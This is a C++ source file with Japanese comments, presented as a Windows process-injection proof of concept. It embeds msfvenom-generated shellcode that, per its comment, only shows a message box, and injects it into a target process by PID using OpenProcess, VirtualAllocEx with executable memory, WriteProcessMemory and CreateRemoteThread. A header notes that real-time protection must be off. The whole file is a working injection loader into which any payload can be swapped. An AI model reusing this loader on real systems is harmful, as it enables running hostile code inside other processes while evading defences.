/*
 * windowsのプロセスインジェクションのPOC
 * リアルタイム保護をOFFにしないと動かない
 */
#include <windows.h>
#include <iostream>

/*
 * メッセージボックスを出すだけのシェルコード
 * msfvenom -p windows/x64/messagebox TEXT=world TITLE=hello -f c -v SHELLCODE
*/
unsigned char SHELLCODE[] =                                                                                                                                                                  
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"                                                                                                                                   
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"                                                                                                                                   
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"                                                                                                                                   
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"                                                                                                                                   
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"                                                                                                                                   
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"                                                                                                                                   
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"                                                                                                                                   
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"                                                                                                                                   
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"                                                                                                                                   
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"                                                                                                                                   
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"                                                                                                                                   
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"                                                                                                                                   
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"                                                                                                                                   
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"                                                                                                                                   
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"                                                                                                                                   
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"                                                                                                                                   
"\x8d\x8d\x1a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"                                                                                                                                   
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"                                                                                                                                   
"\x00\x3e\x4c\x8d\x85\x14\x01\x00\x00\x48\x31\xc9\x41\xba"                                                                                                                                   
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"                                                                                                                                   
"\x56\xff\xd5\x77\x6f\x72\x6c\x64\x00\x68\x65\x6c\x6c\x6f"                                                                                                                                   
"\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

int main(int argc, char* argv[]) {
  if (argc != 2) {
    std::cout << "Usage: " << argv[0] << " <PID of the target process>" << std::endl;
    return 1;
  }
  
  // 指定したPIDのプロセスハンドルの取得
  // PRTOCESS_ALL_ACCESS = 取得したプロセスハンドルに全アクセス権を要求
  DWORD pid = DWORD(atoi(argv[1]));
  HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  if (processHandle == NULL) {
    std::cout << "Failed to open the target process." << std::endl;
    return 1;
  }
  
  // 取得したプロセスにシェルコードを入れるためのメモリ領域の確保
  // PAGE_EXECUTE_READWRITE = 確保したメモリ領域を実行・読み・書き込み可能に設定
  LPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(SHELLCODE), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (remoteBuffer == NULL) {
    std::cout << "Failed to allocate memory in the target process." << std::endl;
    CloseHandle(processHandle);
    return 1;
  }
  
  // 取得したプロセスの確保したメモリ領域にシェルコード書き込み
  BOOL result = WriteProcessMemory(processHandle, remoteBuffer, SHELLCODE, sizeof(SHELLCODE), NULL);
  if (!result) {
    std::cout << "Failed to write to the target process memory." << std::endl;
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    return 1;
  }
  
  // シェルコードの実行
  // ターゲットプロセス内に新しいスレッドを作成して、スレッドの開始位置をhsるコードが格納されている場所に設定。
  HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  if (remoteThread == NULL) {
    std::cout << "Failed to create a remote thread in the target process." << std::endl;
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    return 1;
  }
  
  std::cout << "Successfully executed the shellcode in the target process." << std::endl;
  return 0;
}